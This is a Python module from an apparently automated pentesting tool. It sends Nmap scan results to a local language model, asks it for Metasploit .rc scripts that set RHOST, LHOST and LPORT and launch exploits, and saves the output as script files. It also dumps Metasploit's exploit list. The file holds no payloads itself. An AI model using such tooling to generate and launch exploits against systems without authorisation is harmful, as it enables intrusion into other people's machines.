import os
import re
import requests
from rich import print
from utils.config_ai import AI_MODEL_CODE

LPORT = "8080"


def generate_exploit_rc(nmap_output, target_ip, base_dir):
    prompt = f"""
Genera script .rc per Metasploit per i servizi trovati nel seguente output Nmap.
Per ogni vulnerabilità trovata, proponi un modulo Metasploit con:
- use <modulo>
- set RHOST <target_ip>
- set LHOST 192.168.x.x
- set LPORT {LPORT}
- exploit -j
Scrivi SOLO il contenuto dei file .rc, niente testo extra. Output in italiano tecnico.

{nmap_output}
"""
    try:
        res = requests.post("http://localhost:11434/api/generate", json={
            "model": AI_MODEL_CODE,
            "prompt": prompt,
            "stream": False
        })
        content = res.json().get("response", "")
    except Exception as e:
        print(f"[red]Errore nella generazione dell'exploit:[/red] {e}")
        return []

    # Estrai blocchi "use ... exploit -j"
    blocks = re.split(r"(?=use )", content)
    script_dir = os.path.join(base_dir, "scripts")
    os.makedirs(script_dir, exist_ok=True)
    created_files = []

    for i, block in enumerate(blocks):
        if "use " in block:
            rc_path = os.path.join(script_dir, f"exploit_{i+1}.rc")
            with open(rc_path, "w") as f:
                f.write(block.strip() + "\n")
            created_files.append(rc_path)
            print(f"[green]✓ Creato:[/green] {rc_path}")

    return created_files

def generate_exploit_list():
    import subprocess
    output = subprocess.getoutput('msfconsole -q -x "show exploits; exit"')
    lines = [line.strip() for line in output.splitlines() if "exploit/" in line and line.strip()]
    with open("exploit_list.txt", "w") as f:
        f.write("\n".join(lines))
    print("[green]✅ File 'exploit_list.txt' generato con successo.[/green]")
